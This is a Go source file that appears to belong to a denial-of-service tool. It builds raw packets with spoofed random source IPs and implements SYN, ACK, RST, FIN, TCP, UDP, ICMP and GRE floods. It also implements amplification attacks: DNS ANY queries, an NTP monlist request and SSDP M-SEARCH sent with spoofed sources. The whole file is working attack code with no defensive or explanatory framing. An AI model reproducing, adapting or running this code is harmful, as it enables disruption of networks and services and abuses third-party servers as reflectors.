package main

import (
	"encoding/binary"
	"math/rand"
	"net"
	"os"
	"sync"
	"sync/atomic"
	"syscall"
	"time"
)

func randIP() uint32 {
	return rand.Uint32()
}

func checksum(data []byte) uint16 {
	var sum uint32
	for i := 0; i+1 < len(data); i += 2 {
		sum += uint32(binary.BigEndian.Uint16(data[i : i+2]))
	}
	if len(data)%2 == 1 {
		sum += uint32(data[len(data)-1]) << 8
	}
	for sum>>16 != 0 {
		sum = (sum >> 16) + (sum & 0xffff)
	}
	return ^uint16(sum)
}

func buildIP(src, dst uint32, proto byte, payloadLen int) []byte {
	h := make([]byte, 20)
	h[0] = 0x45
	binary.BigEndian.PutUint16(h[2:], uint16(20+payloadLen))
	binary.BigEndian.PutUint16(h[4:], uint16(rand.Intn(65535)))
	h[8] = 64
	h[9] = proto
	binary.BigEndian.PutUint32(h[12:], src)
	binary.BigEndian.PutUint32(h[16:], dst)
	c := checksum(h)
	binary.BigEndian.PutUint16(h[10:], c)
	return h
}

func buildTCP(src, dst uint32, sport, dport uint16, flags byte) []byte {
	tcp := make([]byte, 20)
	binary.BigEndian.PutUint16(tcp[0:], sport)
	binary.BigEndian.PutUint16(tcp[2:], dport)
	binary.BigEndian.PutUint32(tcp[4:], rand.Uint32())
	tcp[12] = 5 << 4
	tcp[13] = flags
	binary.BigEndian.PutUint16(tcp[14:], 65535)
	pseudo := make([]byte, 12)
	binary.BigEndian.PutUint32(pseudo[0:], src)
	binary.BigEndian.PutUint32(pseudo[4:], dst)
	pseudo[9] = 6
	binary.BigEndian.PutUint16(pseudo[10:], 20)
	c := checksum(append(pseudo, tcp...))
	binary.BigEndian.PutUint16(tcp[16:], c)
	return append(buildIP(src, dst, 6, 20), tcp...)
}

func buildUDP(src, dst uint32, sport, dport uint16, payload []byte) []byte {
	udp := make([]byte, 8)
	binary.BigEndian.PutUint16(udp[0:], sport)
	binary.BigEndian.PutUint16(udp[2:], dport)
	binary.BigEndian.PutUint16(udp[4:], uint16(8+len(payload)))
	pseudo := make([]byte, 12)
	binary.BigEndian.PutUint32(pseudo[0:], src)
	binary.BigEndian.PutUint32(pseudo[4:], dst)
	pseudo[9] = 17
	binary.BigEndian.PutUint16(pseudo[10:], uint16(8+len(payload)))
	c := checksum(append(append(pseudo, udp...), payload...))
	binary.BigEndian.PutUint16(udp[6:], c)
	return append(append(buildIP(src, dst, 17, 8+len(payload)), udp...), payload...)
}

func rawSend() (*os.File, error) {
	fd, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_RAW, syscall.IPPROTO_RAW)
	if err != nil {
		return nil, err
	}
	syscall.SetsockoptInt(fd, syscall.IPPROTO_IP, syscall.IP_HDRINCL, 1)
	return os.NewFile(uintptr(fd), "raw"), nil
}

func rawFlood(cfg Config, builder func(dst uint32, src uint32) []byte) {
	dst := binary.BigEndian.Uint32(net.ParseIP(cfg.Target).To4())
	f, err := rawSend()
	if err != nil {
		atomic.AddInt64(&errors, 1)
		return
	}
	defer f.Close()
	sock, _ := f.SyscallConn()
	sa := &syscall.SockaddrInet4{}
	copy(sa.Addr[:], net.ParseIP(cfg.Target).To4())

	stop := time.Now().Add(cfg.Duration)
	var wg sync.WaitGroup
	for i := 0; i < cfg.Threads; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for time.Now().Before(stop) {
				pkt := builder(dst, randIP())
				sock.Write(func(fd uintptr) bool {
					syscall.Sendto(int(fd), pkt, 0, sa)
					return true
				})
				atomic.AddInt64(&sent, 1)
			}
		}()
	}
	wg.Wait()
}

func attackTCP(cfg Config) {
	stop := time.Now().Add(cfg.Duration)
	var wg sync.WaitGroup
	addr := cfg.Target + ":" + itoa(cfg.Port)
	for i := 0; i < cfg.Threads; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for time.Now().Before(stop) {
				c, err := net.DialTimeout("tcp", addr, 3*time.Second)
				if err != nil {
					atomic.AddInt64(&errors, 1)
					continue
				}
				c.Write(make([]byte, cfg.Size))
				c.Close()
				atomic.AddInt64(&sent, 1)
			}
		}()
	}
	wg.Wait()
}

func attackSYN(cfg Config) {
	rawFlood(cfg, func(dst, src uint32) []byte {
		return buildTCP(src, dst, uint16(rand.Intn(65535)), uint16(cfg.Port), 0x02)
	})
}

func attackACK(cfg Config) {
	rawFlood(cfg, func(dst, src uint32) []byte {
		return buildTCP(src, dst, uint16(rand.Intn(65535)), uint16(cfg.Port), 0x10)
	})
}

func attackRST(cfg Config) {
	rawFlood(cfg, func(dst, src uint32) []byte {
		return buildTCP(src, dst, uint16(rand.Intn(65535)), uint16(cfg.Port), 0x04)
	})
}

func attackFIN(cfg Config) {
	rawFlood(cfg, func(dst, src uint32) []byte {
		return buildTCP(src, dst, uint16(rand.Intn(65535)), uint16(cfg.Port), 0x01)
	})
}

func attackUDP(cfg Config) {
	stop := time.Now().Add(cfg.Duration)
	var wg sync.WaitGroup
	for i := 0; i < cfg.Threads; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			conn, err := net.Dial("udp", cfg.Target+":"+itoa(cfg.Port))
			if err != nil {
				atomic.AddInt64(&errors, 1)
				return
			}
			defer conn.Close()
			buf := make([]byte, cfg.Size)
			for time.Now().Before(stop) {
				conn.Write(buf)
				atomic.AddInt64(&sent, 1)
			}
		}()
	}
	wg.Wait()
}

func attackICMP(cfg Config) {
	rawFlood(cfg, func(dst, src uint32) []byte {
		icmp := []byte{8, 0, 0, 0, 0, 1, 0, 1}
		icmp = append(icmp, make([]byte, cfg.Size)...)
		binary.BigEndian.PutUint16(icmp[2:], checksum(icmp))
		return append(buildIP(src, dst, 1, len(icmp)), icmp...)
	})
}

func attackDNS(cfg Config) {
	dnsPayload := []byte{
		0xab, 0xcd, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x03, 'i', 's', 'c', 0x03, 'o', 'r', 'g', 0x00, 0x00, 0xff, 0x00, 0x01,
	}
	rawFlood(cfg, func(dst, src uint32) []byte {
		return buildUDP(src, dst, uint16(rand.Intn(65535)), 53, dnsPayload)
	})
}

func attackNTP(cfg Config) {
	ntpPayload := []byte{0x17, 0x00, 0x03, 0x2a, 0x00, 0x00, 0x00, 0x00}
	rawFlood(cfg, func(dst, src uint32) []byte {
		return buildUDP(src, dst, uint16(rand.Intn(65535)), 123, ntpPayload)
	})
}

func attackSSDP(cfg Config) {
	ssdp := []byte("M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: \"ssdp:discover\"\r\nMX: 1\r\nST: ssdp:all\r\n\r\n")
	rawFlood(cfg, func(dst, src uint32) []byte {
		return buildUDP(src, dst, uint16(rand.Intn(65535)), 1900, ssdp)
	})
}

func attackGRE(cfg Config) {
	rawFlood(cfg, func(dst, src uint32) []byte {
		gre := make([]byte, 4+cfg.Size)
		binary.BigEndian.PutUint16(gre[2:], 0x0800)
		return append(buildIP(src, dst, 47, len(gre)), gre...)
	})
}

func itoa(i int) string {
	if i == 0 {
		return "0"
	}
	digits := []byte{}
	neg := i < 0
	if neg {
		i = -i
	}
	for i > 0 {
		digits = append([]byte{byte('0' + i%10)}, digits...)
		i /= 10
	}
	if neg {
		return "-" + string(digits)
	}
	return string(digits)
}
